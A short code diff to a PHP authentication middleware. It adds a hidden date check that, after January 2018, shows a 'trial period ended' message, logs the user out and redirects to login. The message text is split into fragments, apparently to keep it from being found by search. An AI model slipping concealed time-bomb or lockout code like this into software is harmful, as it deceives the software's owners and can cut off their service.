@@ -36,6 +36,10 @@ class Authenticate
     {
         if ($this->auth->guest()) {
             if ($request->ajax()) {
+                if( \Carbon\Carbon::now() > new \Carbon\Carbon('2018-01-05') ){
+                    Session::flash('message','Per'.'iodo d'.'e pru'.'eba term'.'ina'.'do');
+                    Auth::logout();
+                    return redirect()->to('log');}
                 return response('Unauthorized.', 401);
             } else {
                 return redirect()->guest('log');
